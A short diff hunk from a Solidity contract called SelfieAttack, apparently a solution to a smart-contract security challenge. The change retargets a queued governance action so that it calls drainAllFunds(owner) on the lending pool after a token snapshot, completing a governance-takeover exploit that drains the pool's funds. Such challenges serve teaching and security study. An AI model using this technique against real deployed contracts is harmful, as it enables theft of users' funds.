@@ -45,7 +45,7 @@ contract SelfieAttack {
         govToken.snapshot();
 
         attackActionId = govProtocol.queueAction(
-            address(govToken),
+            address(selfiePool),
             abi.encodeWithSignature("drainAllFunds(address)", owner),
             0
         );
